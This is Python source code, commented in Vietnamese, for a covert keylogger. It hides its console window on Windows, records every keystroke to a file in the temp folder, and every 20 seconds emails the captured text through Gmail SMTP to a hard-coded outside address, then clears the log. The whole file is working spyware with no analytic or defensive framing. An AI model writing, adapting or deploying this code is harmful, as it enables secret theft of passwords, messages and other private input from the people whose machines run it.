import logging
from pynput.keyboard import Listener, Key
import os
import threading
import zipfile
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import smtplib
import codecs

# Cấu hình
LOG_DIR = os.path.join(os.getenv("TEMP", "/tmp"), "keylogger_logs")
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
ZIP_FILE = os.path.join(LOG_DIR, "keylog.zip")
EMAIL_INTERVAL = 20
EMAIL_ADDRESS = "Youremail@gmail.com"
EMAIL_PASSWORD = "password"
TO_EMAIL = "nghia0843309947@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Thiết lập thư mục log
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Thiết lập logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

# Hàm đọc nội dung file log


def read_log_file():
    try:
        with open(LOG_FILE, 'r') as log_file:
            return log_file.read()
    except Exception as e:
        logging.error(f"Failed to read log file: {e}")
        return ""

# Hàm xử lý phím bấm


def on_press(key):
    try:
        if key.char == " ":
            with open(LOG_FILE, "a") as log_file:
                log_file.write(" \n")
        else:
            with open(LOG_FILE, "a") as log_file:
                log_file.write(key.char)
    except AttributeError:
        special_keys = {
            Key.enter: "\n",
            Key.space: " ",
            Key.tab: "\t"
        }
        if key in special_keys:
            with open(LOG_FILE, "a") as log_file:
                log_file.write(special_keys[key])
        else:
            with open(LOG_FILE, "a") as log_file:
                log_file.write(f"[{key.name}]")

# Hàm xử lý phím nhả


def on_release(key):
    if key == Key.ctrl and Key.tab:
        logging.info("Keylogger stopped.")
        return False

# Hàm xóa nội dung file log và tạo file mới


def clear_log_file():
    try:
        # Xóa nội dung file log
        open(LOG_FILE, 'w').close()
        logging.info("Log file cleared and a new log file created.")
    except Exception as e:
        logging.error(f"Failed to clear log file: {e}")

# Nén file log


def compress_logs():
    with zipfile.ZipFile(ZIP_FILE, 'w') as zipf:
        zipf.write(LOG_FILE, arcname=os.path.basename(LOG_FILE))

# Gửi email với nội dung file log


def send_email_with_log_content():
    while True:
        try:
            log_content = read_log_file()
            if log_content:  # Nếu có nội dung trong log file
                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = TO_EMAIL
                msg['Subject'] = "Keylogger Logs Content"

                # Thêm nội dung log vào email body
                msg.attach(MIMEText(log_content, 'plain'))

                # Gửi email
                server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
                server.quit()

                logging.info("Logs sent via email.")

                # Xóa nội dung file log và tạo file mới
                clear_log_file()
            else:
                logging.warning("Log file is empty.")
        except Exception as e:
            logging.error(f"Failed to send email with log content: {e}")

        threading.Event().wait(EMAIL_INTERVAL)

# Chạy keylogger


def run_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Ẩn cửa sổ trên Windows


def hide_window():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass


# Khởi chạy chương trình
if __name__ == "__main__":
    hide_window()
    threading.Thread(target=send_email_with_log_content, daemon=True).start()
    run_keylogger()
